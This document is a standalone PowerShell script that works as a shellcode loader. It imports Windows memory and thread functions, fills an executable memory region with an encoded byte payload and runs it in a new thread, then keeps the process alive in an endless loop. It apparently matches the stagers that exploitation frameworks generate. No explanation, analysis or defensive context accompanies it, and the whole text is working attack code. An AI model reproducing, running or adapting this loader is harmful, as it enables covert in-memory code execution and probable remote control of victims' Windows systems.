$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcd,0xbb,0x2c,0x18,0xb9,0x68,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x58,0x18,0x83,0xe8,0xfc,0x03,0x58,0x38,0xfa,0x4c,0x94,0xa8,0x78,0xae,0x65,0x28,0x1d,0x26,0x80,0x19,0x1d,0x5c,0xc0,0x09,0xad,0x16,0x84,0xa5,0x46,0x7a,0x3d,0x3e,0x2a,0x53,0x32,0xf7,0x81,0x85,0x7d,0x08,0xb9,0xf6,0x1c,0x8a,0xc0,0x2a,0xff,0xb3,0x0a,0x3f,0xfe,0xf4,0x77,0xb2,0x52,0xad,0xfc,0x61,0x43,0xda,0x49,0xba,0xe8,0x90,0x5c,0xba,0x0d,0x60,0x5e,0xeb,0x83,0xfb,0x39,0x2b,0x25,0x28,0x32,0x62,0x3d,0x2d,0x7f,0x3c,0xb6,0x85,0x0b,0xbf,0x1e,0xd4,0xf4,0x6c,0x5f,0xd9,0x06,0x6c,0xa7,0xdd,0xf8,0x1b,0xd1,0x1e,0x84,0x1b,0x26,0x5d,0x52,0xa9,0xbd,0xc5,0x11,0x09,0x1a,0xf4,0xf6,0xcc,0xe9,0xfa,0xb3,0x9b,0xb6,0x1e,0x45,0x4f,0xcd,0x1a,0xce,0x6e,0x02,0xab,0x94,0x54,0x86,0xf0,0x4f,0xf4,0x9f,0x5c,0x21,0x09,0xff,0x3f,0x9e,0xaf,0x8b,0xad,0xcb,0xdd,0xd1,0xb9,0x38,0xec,0xe9,0x39,0x57,0x67,0x99,0x0b,0xf8,0xd3,0x35,0x27,0x71,0xfa,0xc2,0x48,0xa8,0xba,0x5d,0xb7,0x53,0xbb,0x74,0x73,0x07,0xeb,0xee,0x52,0x28,0x60,0xef,0x5b,0xfd,0x27,0xbf,0xf3,0xae,0x87,0x6f,0xb3,0x1e,0x60,0x7a,0x3c,0x40,0x90,0x85,0x97,0xe9,0x3b,0x7f,0x7f,0xd6,0x14,0x7f,0x15,0xbe,0x66,0x80,0xf8,0x62,0xee,0x66,0x90,0x8a,0xa6,0x31,0x0c,0x32,0xe3,0xca,0xad,0xbb,0x39,0xb7,0xed,0x30,0xce,0x47,0xa3,0xb0,0xbb,0x5b,0x53,0x31,0xf6,0x06,0xf5,0x4e,0x2c,0x2c,0xf9,0xda,0xcb,0xe7,0xae,0x72,0xd6,0xde,0x98,0xdc,0x29,0x35,0x93,0xd5,0xbf,0xf6,0xcb,0x19,0x50,0xf7,0x0b,0x4c,0x3a,0xf7,0x63,0x28,0x1e,0xa4,0x96,0x37,0x8b,0xd8,0x0b,0xa2,0x34,0x89,0xf8,0x65,0x5d,0x37,0x27,0x41,0xc2,0xc8,0x02,0x53,0x3e,0x1f,0x6a,0x21,0x2e,0xa3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};